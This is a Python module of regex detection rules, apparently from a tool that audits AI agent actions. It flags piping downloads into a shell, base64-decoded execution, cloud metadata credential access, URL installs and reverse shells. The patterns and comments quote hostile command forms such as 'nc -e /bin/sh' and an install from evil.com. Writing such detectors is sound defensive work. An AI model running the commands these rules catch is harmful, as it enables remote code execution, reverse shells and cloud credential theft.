"""U: unsafe execution patterns."""
from __future__ import annotations

from agentaudit.events import NetworkRequest, Severity, ShellCommand
from agentaudit.rules.base import RegexRule, Rule


class U001(RegexRule):
    id = "U001"
    severity = Severity.CRITICAL
    title = "Pipe remote content into shell"
    explanation = "Downloads executed without inspection run arbitrary attacker-controlled code."
    recommendation = "Download, review, then run; remove any persistence the script added."
    # middle spans capped {0,400}: adversarial repeated anchors stay linear (ReDoS hardening)
    # \b prefix (v0.1.1): `xcurl ... | sh` must not match
    pattern = (
        r"\b(curl|wget|iwr|Invoke-WebRequest)\b[^|;&\n]{0,400}\|"
        r"\s*(sudo\s+)?(iex|Invoke-Expression|(ba|z|da)?sh)\b"
    )


class U002(RegexRule):
    id = "U002"
    severity = Severity.HIGH
    title = "Execute obfuscated payload"
    explanation = "Base64-decoded execution hides the real payload from review."
    recommendation = "Decode the payload and inspect it before trusting the session."
    # middle spans capped {0,400}: adversarial repeated anchors stay linear (ReDoS hardening)
    pattern = (
        r"base64\s+(-d|--decode)\b[^|;&\n]{0,400}\|[^|;&\n]{0,400}sh\b"
        r"|FromBase64String"
        r"|echo\s+[A-Za-z0-9+/=]{60,}\s*\|\s*(ba)?sh\b"
    )


class U003(RegexRule):
    id = "U003"
    severity = Severity.CRITICAL
    title = "Cloud metadata endpoint access"
    explanation = "Instance metadata endpoints return cloud credentials (SSRF to IAM takeover)."
    recommendation = "Rotate cloud credentials for the instance immediately."
    # NOTE: `(?![\w.])` after each host (DEVIATION from the plan's bare literals):
    # the plan's pattern matched the IP inside `169.254.169.254.evil.com`, failing
    # its own planned miss case (subdomain squatting). The lookahead rejects the
    # host only when more hostname (word chars or dots) follows; the real
    # endpoints are followed by `/`, `:`, whitespace or end (e.g.
    # `169.254.169.254/latest/meta-data/` still matches).
    pattern = (
        r"169\.254\.169\.254(?![\w.])|169\.254\.170\.2(?![\w.])"
        r"|metadata\.google\.internal(?![\w.])|metadata\.azure\.com(?![\w.])"
    )
    applies_to = (ShellCommand, NetworkRequest)


class U004(RegexRule):
    id = "U004"
    severity = Severity.LOW
    title = "Install from unpinned URL"
    explanation = "Global installs from raw URLs bypass package registries and integrity checks."
    recommendation = "Prefer registry installs with pinned versions."
    # middle spans capped {0,400}: adversarial repeated anchors stay linear (ReDoS hardening)
    # NOTE: npm branch accepts ANY `https?://`/`git+` (DEVIATION from the plan's
    # `git\+?https?://|https?://\S+\.git\b`): the plan's pattern required a `.git`
    # suffix and missed its own planned hit case `npm install -g https://evil.com/pkg.tgz`.
    # Mirrors the pip branch in the same pattern (any URL = unpinned install).
    pattern = (
        r"(npm|pnpm|yarn)\s+(i|install)\b[^|;&\n]{0,400}(https?://|git\+)"
        r"|pip3?\s+install\b[^|;&\n]{0,400}(https?://|git\+)"
    )


class U005(RegexRule):
    id = "U005"
    severity = Severity.CRITICAL
    title = "Reverse-shell pattern"
    explanation = "Reverse shells hand an interactive machine shell to a remote party."
    recommendation = "Kill the connection; investigate the machine for further compromise."
    # middle spans capped {0,400}: adversarial repeated anchors stay linear (ReDoS hardening)
    # NOTE: `/?(bin/|usr/bin/)?` before `(ba)?sh` (DEVIATION from the plan's
    # `/?(ba)?sh`): the plan's pattern required `sh` right after the optional
    # slash and missed its own planned hit case `nc -e /bin/sh 10.0.0.1 4444`
    # (the canonical GTFOBins form, where `bin/` sits between `/` and `sh`).
    # Explicit path segments (not `\S*`) keep backtracking bounded.
    pattern = (
        r"\bnc\b[^|;&\n]{0,400}\s-e\s+/?(bin/|usr/bin/)?(ba)?sh\b"
        r"|/dev/tcp/"
        r"|\bsocat\b[^|;&\n]{0,400}exec"
    )


class U006(RegexRule):
    id = "U006"
    severity = Severity.MEDIUM
    title = "Downloaded binary executed"
    explanation = "A file was made executable and immediately run in one command."
    recommendation = "Verify the binary's origin and hash before further use."
    pattern = r"chmod\s+\+x\s+\S+\s*(&&|;)\s*\./"


def rules() -> list[Rule]:
    return [U001(), U002(), U003(), U004(), U005(), U006()]
